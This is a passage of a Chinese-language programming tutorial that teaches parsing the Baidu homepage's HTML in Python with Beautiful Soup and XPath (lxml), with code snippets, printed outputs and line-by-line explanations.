class="name">bd_soup</span>.prettify())</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">   百度一下，你就知道</span><br><span class="line">  <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span> <span class="attr">link</span>=<span class="string">"#0000cc"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"head"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"head_wrapper"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form_wrapper"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">"129"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> <span class="attr">width</span>=<span class="string">"270"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"u1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://news.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trnews"</span>&gt;</span></span><br><span class="line">       新闻</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"https://www.hao123.com"</span> <span class="attr">name</span>=<span class="string">"tj_trhao123"</span>&gt;</span></span><br><span class="line">       hao123</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://map.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trmap"</span>&gt;</span></span><br><span class="line">       地图</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://v.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trvideo"</span>&gt;</span></span><br><span class="line">       视频</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://tieba.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trtieba"</span>&gt;</span></span><br><span class="line">       贴吧</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"bri"</span> <span class="attr">href</span>=<span class="string">"//www.baidu.com/more/"</span> <span class="attr">name</span>=<span class="string">"tj_briicon"</span> <span class="attr">style</span>=<span class="string">"display: block;"</span>&gt;</span></span><br><span class="line">       更多产品</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftCon"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftConw"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"lh"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://home.baidu.com"</span>&gt;</span></span><br><span class="line">       关于百度</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ir.baidu.com"</span>&gt;</span></span><br><span class="line">       About Baidu</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"cp"</span>&gt;</span></span><br><span class="line">      ©2017 Baidu</span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/duty/"</span>&gt;</span></span><br><span class="line">       使用百度前必读</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"cp-feedback"</span> <span class="attr">href</span>=<span class="string">"http://jianyi.baidu.com/"</span>&gt;</span></span><br><span class="line">       意见反馈</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      京ICP证030173号</span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="节点选择"><a href="#节点选择" class="headerlink" title="节点选择"></a>节点选择</h3><p>在Beautiful Soup中，我们可以很方便的选择想要得到的节点，只需要在<code>bd_soup</code>对象中使用<code>.</code>的方式即可，使用如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bd_title_bj = bd_soup.title</span><br><span class="line">bd_title_bj_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.name</span></span><br><span class="line">bd_title_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.string</span></span><br><span class="line">bd_title_parent_bj_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.parent</span><span class="selector-class">.name</span></span><br><span class="line">bd_image_bj = bd_soup.img</span><br><span class="line">bd_image_bj_dic = bd_soup<span class="selector-class">.img</span><span class="selector-class">.attrs</span></span><br><span class="line">bd_image_all = bd_soup.find_all(<span class="string">"img"</span>)</span><br><span class="line">bd_image_idlg = bd_soup.find(<span class="string">"div"</span>, id=<span class="string">"lg"</span>)</span><br></pre></td></tr></table></figure><p>代码解读：</p><ul><li><code>bd_soup.title</code>，正如前面所说，Beautiful Soup可以很简单的解析对应的页面，只需要使用<code>bd_soup.</code>的方式进行选择节点即可，该行代码正是获得百度首页html的<code>title</code>节点内容</li><li><code>bd_soup.title.name</code>，使用<code>.name</code>的形式即可获取节点的名称</li><li>bd_soup.title.string，使用<code>.string</code>的形式即可获得节点当中的内容，这句代码就是获取百度首页的title节点的内容，即浏览器导航条中所显示的<code>百度一下，你就知道</code></li><li><code>bd_soup.title.parent.name</code>，使用<code>.parent</code>可以该节点的父节点，通俗地讲就是该节点所对应的上一层节点，然后使用<code>.name</code>获取父节点名称</li><li><code>bd_soup.img</code>，如<code>bd_soup.title</code>一样，该代码获取的是<code>img</code>节点，只不过需要注意的是：在上面html中我们可以看见总共有两个<code>img</code>节点，而如果使用<code>.img</code>的话默认是获取html中的第一个<code>img</code>节点，而不是所有</li><li><code>bd_soup.img.attrs</code>，获取<code>img</code>节点中所有的属性及属性内容，该代码输出的结果是一个键值对的字典格式，所以之后我们只需要通过字典的操作来获取属性所对应的内容即可。比如<code>bd_soup.img.attrs.get(&quot;src&quot;)</code>和<code>bd_soup.img.attrs[&quot;src&quot;]</code>的方式来获取<code>img</code>节点所对应的<code>src</code>属性的内容，即图片链接</li><li><code>bd_soup.find_all(&quot;img&quot;)</code>，在上述中的<code>.img</code>操作默认只能获取第一个<code>img</code>节点，而要想获取html中所有的<code>img</code>节点，我们需要使用<code>.find_all(&quot;img&quot;)</code>方法，所返回的是一个列表格式，列表内容为所有的选择的节点</li><li><code>bd_soup.find(&quot;div&quot;, id=&quot;lg&quot;)</code>，在实际运用中，我们往往会选择指定的节点，这个时候我们可以使用<code>.find()</code>方法，里面可传入所需查找节点的属性，这里需要注意的是：在传入<code>class</code>属性的时候其中的写法是<code>.find(&quot;div&quot;, class_=&quot;XXX&quot;)</code>的方式。所以该行代码表示的是获取<code>id</code>属性为<code>lg</code>的<code>div</code>节点，此外，在上面的<code>.find_all()</code>同样可以使用该方法来获取指定属性所对应的所有节点</li></ul><p>上述代码中解析的结果对应打印如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;百度一下，你就知道&lt;/title&gt;</span><br><span class="line">title</span><br><span class="line">百度一下，你就知道</span><br><span class="line">head</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt;</span><br><span class="line">&#123;<span class="string">'hidefocus'</span>: <span class="string">'true'</span>, <span class="string">'src'</span>: <span class="string">'//www.baidu.com/img/bd_logo1.png'</span>, <span class="string">'width'</span>: <span class="string">'270'</span>, <span class="string">'height'</span>: <span class="string">'129'</span>&#125;</span><br><span class="line">[&lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt;, &lt;img src=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;]</span><br><span class="line">&lt;<span class="selector-tag">div</span> id=<span class="string">"lg"</span>&gt; &lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p>在上一小节节点选择我们讲到了部分数据提取的方法，然而，Beautiful Soup的强大之处还不止步于此。接下来我们继续揭开其神秘的面纱。</p><h4 id="get-text"><a href="#get-text" class="headerlink" title=".get_text()"></a>.get_text()</h4><p>获取对象中所有的内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">all_content</span> = bd_soup.get_text()</span><br></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">百度一下，你就知道                     新闻 hao123 地图 视频 贴吧  登录  document.<span class="built_in">write</span>('&lt;a href=<span class="string">"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === "</span><span class="string">" ? "</span>?<span class="string">" : "</span>&amp;<span class="string">")+ "</span>bdorz_come=<span class="number">1</span><span class="string">")+ '"</span> <span class="built_in">name</span>=<span class="string">"tj_login"</span> <span class="built_in">class</span>=<span class="string">"lb"</span>&gt;登录&lt;/a&gt;');</span><br><span class="line"></span><br><span class="line">                更多产品       关于百度 About Baidu  ©<span class="number">2017</span> Baidu 使用百度前必读  意见反馈 京ICP证<span class="number">030173</span>号</span><br></pre></td></tr></table></figure><h4 id="strings，-stripped-strings"><a href="#strings，-stripped-strings" class="headerlink" title=".strings，.stripped_strings"></a>.strings，.stripped_strings</h4><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="name">type</span>(<span class="name">bd_soup</span>.strings))</span><br><span class="line"># &lt;class 'generator'&gt;</span><br></pre></td></tr></table></figure><p><code>.strings</code>用于提取<code>bd_soup</code>对象中所有的内容，而从上面的输出结果我们可以看出<code>.strings</code>的类型是一个生成器，对此可以使用循环来提取出其中的内容。但是我们在使用<code>.strings</code>的过程中会发现提取出来的内容有很多的空格以及换行，对此我们可以使用<code>.stripped_strings</code>方法来解决该问题，用法如下：</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">in</span> bd_soup.stripped_strings:</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">each</span>)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">百度一下，你就知道</span><br><span class="line">新闻</span><br><span class="line"><span class="symbol">hao123</span></span><br><span class="line">地图</span><br><span class="line">视频</span><br><span class="line">贴吧</span><br><span class="line">登录</span><br><span class="line">更多产品</span><br><span class="line">关于百度</span><br><span class="line"><span class="symbol">About</span> <span class="keyword">Baidu</span></span><br><span class="line"><span class="keyword">©2017 </span><span class="keyword">Baidu</span></span><br><span class="line"><span class="keyword">使用百度前必读</span></span><br><span class="line"><span class="keyword">意见反馈</span></span><br><span class="line"><span class="keyword">京ICP证030173号</span></span><br></pre></td></tr></table></figure><h4 id="parent，-children，-parents"><a href="#parent，-children，-parents" class="headerlink" title=".parent，.children，.parents"></a>.parent，.children，.parents</h4><p><code>.parent</code>可以选择该节点的父节点，<code>.children</code>可以选择该节点的孩子节点，<code>.parents</code>选择该节点所有的上层节店，返回的是生成器，各用法如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bd_div_bj = bd_soup.<span class="builtin-name">find</span>(<span class="string">"div"</span>, <span class="attribute">id</span>=<span class="string">"u1"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(type(bd_div_bj.parent))</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"*"</span> * 50)</span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> bd_div_bj.children:</span><br><span class="line"><span class="builtin-name">print</span>(child)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"*"</span> * 50)</span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> bd_div_bj.parents:</span><br><span class="line"><span class="builtin-name">print</span>(parent.name)</span><br></pre></td></tr></table></figure><p>结果输出：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">class</span> 'bs4.element.Tag'&gt;</span><br><span class="line">**************************************************</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://news.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trnews"</span>&gt;新闻&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"https://www.hao123.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trhao123"</span>&gt;hao123&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://map.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trmap"</span>&gt;地图&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://v.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trvideo"</span>&gt;视频&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://tieba.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trtieba"</span>&gt;贴吧&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">**************************************************</span><br><span class="line"><span class="keyword">div</span></span><br><span class="line"><span class="keyword">div</span></span><br><span class="line"><span class="keyword">div</span></span><br><span class="line">body</span><br><span class="line">html</span><br></pre></td></tr></table></figure><h3 id="Beautiful-Soup小结"><a href="#Beautiful-Soup小结" class="headerlink" title="Beautiful Soup小结"></a>Beautiful Soup小结</h3><p>Beautiful Soup主要的用法就是以上一些，还有其他一些操作在实际开发过程中使用的不多，这里不做过多的讲解了，所以整体来讲Beautiful Soup的使用还是比较简单的，其他一些操作可见官方文档：<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children</a></p><h2 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h2><p>XPath全称是XML Path Language，它既可以用来解析XML，也可以用来解析HTML。在上一部分已经讲解了Beautiful Soup的一些常见的骚操作，在这里，我们继续来看看XPath的使用，瞧一瞧XPath的功能到底有多么的强大以致于受到了不少开发者的青睐。同Beautiful Soup一样，在XPath中提供了非常简洁的节点选择的方法，Beautiful Soup主要是通过<code>.</code>的方式来进行子节点或者子孙节点的选择，而在XPath中则主要通过<code>/</code>的方式来选择节点。除此之外，在XPath中还提供了大量的内置函数来处理各个数据之间的匹配关系。</p><p>首先，我们先来看看XPath常见的节点匹配规则：</p><div class="table-container"><table><thead><tr><th style="text-align:center">表达式</th><th style="text-align:center">解释说明</th></tr></thead><tbody><tr><td style="text-align:center"><code>/</code></td><td style="text-align:center">在当前节点中选取直接子节点</td></tr><tr><td style="text-align:center"><code>//</code></td><td style="text-align:center">在当前节点中选取子孙节点</td></tr><tr><td style="text-align:center"><code>.</code></td><td style="text-align:center">选取当前节点</td></tr><tr><td style="text-align:center"><code>..</code></td><td style="text-align:center">选取当前节点的父节点</td></tr><tr><td style="text-align:center"><code>@</code></td><td style="text-align:center">指定属性（id、class……）</td></tr></tbody></table></div><p>下面我们继续拿上面的百度首页的HTML来讲解下XPath的使用。</p><h3 id="节点选择-1"><a href="#节点选择-1" class="headerlink" title="节点选择"></a>节点选择</h3><p>要想正常使用Xpath，我们首先需要正确导入对应的模块，在此我们一般使用的是<code>lxml</code>，操作示例如下：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from lxml <span class="built_in">import</span> etree</span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="attr">response</span> = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attr">encoding</span> = response.apparent_encoding</span><br><span class="line">    response.<span class="attr">encoding</span> = encoding</span><br><span class="line">    print(response.text)</span><br><span class="line">    <span class="attr">bd_bj</span> = etree.HTML(response.text)</span><br><span class="line">    <span class="attr">bd_html</span> = etree.tostring(bd_bj).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(html.unescape(bd_html))</span><br></pre></td></tr></table></figure><p>1~9行代码如Beautiful Soup一致，下面对之后的代码进行解释：</p><ul><li><code>etree.HTML(response.text)</code>，使用<code>etree</code>模块中的<code>HTML</code>类来对百度html<code>(response.text)</code>进行初始化以构造XPath解析对象，返回的类型为<code>&lt;Element html at 0x1aba86b1c08&gt;</code></li><li><code>etree.tostring(bd_html_elem).decode(&quot;utf-8&quot;)</code>，将上述的对象转化为字符串类型且编码为<code>utf-8</code></li><li><code>html.unescape(bd_html)</code>，使用HTML5标准定义的规则将<code>bd_html</code>转换成对应的unicode字符。</li></ul><p>打印出的结果如Beautiful Soup使用时一致，这里就不再显示了，不知道的读者可回翻。既然我们已经得到了Xpath可解析的对象<code>(bd_bj)</code>，下面我们就需要针对这个对象来选择节点了，在上面我们也已经提到了，XPath主要是通过<code>/</code>的方式来提取节点，请看下面Xpath中节点选择的一些常见操作：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">all_bj = bd_bj.xpath(<span class="string">"//*"</span>)             <span class="comment"># 选取所有节点</span></span><br><span class="line">img_bj = bd_bj.xpath(<span class="string">"//img"</span>)           <span class="comment"># 选取指定名称的节点</span></span><br><span class="line">p_a_zj_bj = bd_bj.xpath(<span class="string">"//p/a"</span>)        <span class="comment"># 选取直接节点</span></span><br><span class="line">p_a_all_bj = bd_bj.xpath(<span class="string">"//p//a"</span>)      <span class="comment"># 选取所有节点</span></span><br><span class="line">head_bj = bd_bj.xpath(<span class="string">"//title/.."</span>)     <span class="comment"># 选取父节点</span></span><br></pre></td></tr></table></figure><p>结果如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[&lt;Element html <span class="meta">at</span> <span class="number">0x14d6a6d1c88</span>&gt;, &lt;Element head <span class="meta">at</span> <span class="number">0x14d6a6e4408</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e4448</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e4488</span>&gt;, &lt;Element meta <span class="meta">at</span> <span class="number">0x14d6a6e44c8</span>&gt;, &lt;Element link <span class="meta">at</span> <span class="number">0x14d6a6e4548</span>&gt;, &lt;Element title <span class="meta">at</span> <span class="number">0x14d6a6e4588</span>&gt;, &lt;Element body <span class="meta">at</span> <span class="number">0x14d6a6e45c8</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4608</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4508</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4648</span>&gt;, &lt;Element <span class="keyword">div</span> <span class="meta">at</span> <span class="number">0x14d6a6e4688</span>&gt;, ......]</span><br><span class="line"></span><br><span class="line">[&lt;Element img <span class="meta">at</span> <span class="number">0x14d6a6e4748</span>&gt;, &lt;Element img <span class="meta">at</span> <span class="number">0x14d6a6e4ec8</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4d88</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4dc8</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e48</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e88</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4d88</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4dc8</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e48</span>&gt;, &lt;Element a <span class="meta">at</span> <span class="number">0x14d6a6e4e88</span>&gt;]</span><br><span class="line"></span><br><span class="line">[&lt;Element head <span class="meta">at</span> <span class="number">0x14d6a6e4408</span>&gt;]</span><br></pre></td></tr></table></figure></p><ul><li><code>all_bj = bd_bj.xpath(&quot;//*&quot;)</code>，使用<code>//</code>可以选择当前节点<code>(html)</code>下的所有子孙节点，且以一个列表的形式来返回，列表元素通过<code>bd_bj</code>一样是<code>element</code>对象，下面的返回类型一致</li><li><code>img_bj = bd_bj.xpath(&quot;//img&quot;)</code>，选取当前节点下指定名称的节点，这里建议与Beautiful Soup的使用相比较可增强记忆，Beautiful Soup是通过<code>.find_all(&quot;img&quot;)</code>的形式</li><li><code>p_a_zj_bj = bd_bj.xpath(&quot;//p/a&quot;)</code>，选取当前节点下的所有<code>p</code>节点下的直接子<code>a</code>节点，这里需要注意的是<strong>”直接“</strong>，如果<code>a</code>不是<code>p</code>节点的直接子节点则选取失败</li><li><code>p_a_all_bj = bd_bj.xpath(&quot;//p//a&quot;)</code> ，选取当前节点下的所有<code>p</code>节点下的所有子孙<code>a</code>节点，这里需要注意的是<strong>”所有“</strong>，注意与上一个操作进行区分</li><li><code>head_bj = bd_bj.xpath(&quot;//title/..&quot;)</code>，选取当前节点下的<code>title</code>节点的父节点，即<code>head</code>节点</li></ul><h3 id="数据提取-1"><a href="#数据提取-1" class="headerlink" title="数据提取"></a>数据提取</h3><p>在了解如何选择指定的节点之后，我们就需要提取节点中所包含的数据了，具体提取请看下面的示例：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">img_href_ls</span> = bd_bj.xpath(<span class="string">"//img/@src"</span>)</span><br><span class="line"><span class="attr">img_href</span> = bd_bj.xpath(<span class="string">"//div[@id='lg']/img[@hidefocus='true']/@src"</span>)</span><br><span class="line"><span class="attr">a_content_ls</span> = bd_bj.xpath(<span class="string">"//a//text()"</span>)</span><br><span class="line"><span class="attr">a_news_content</span> = bd_bj.xpath(<span class="string">"//a[@class='mnav' and @name='tj_trnews']/text()"</span>)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight scheme"><table><tr><td 